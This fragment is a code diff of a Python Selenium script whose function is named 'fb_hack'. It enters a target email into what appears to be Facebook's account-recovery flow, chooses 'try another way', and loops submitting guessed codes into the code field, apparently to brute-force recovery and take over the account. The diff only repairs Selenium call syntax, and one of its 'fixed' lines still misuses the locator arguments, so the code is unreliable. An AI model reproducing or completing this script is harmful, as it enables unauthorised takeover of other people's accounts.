@@ -43,7 +43,7 @@ def fb_hack(email, codex, respect):
   search_box.send_keys(email)
   search_box.submit()
   wait = WebDriverWait(driver, 10)
-  element = wait.until(EC.visibility_of_element_located((by = By.NAME, "tryanotherway")))
+  element = wait.until(EC.visibility_of_element_located(by = By.NAME, value = "tryanotherway"))
   search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
   search_button.click()
   "make respect properly"
@@ -64,7 +64,7 @@ def fb_hack(email, codex, respect):
       print("working", end='\r')
     else:
       try:
-        searchbox = driver.find_element(By.NAME == "n")
+        searchbox = driver.find_element(by = By.NAME, value = "n")
         searchbox.send_keys(p)
         searchbox.submit()
       except:
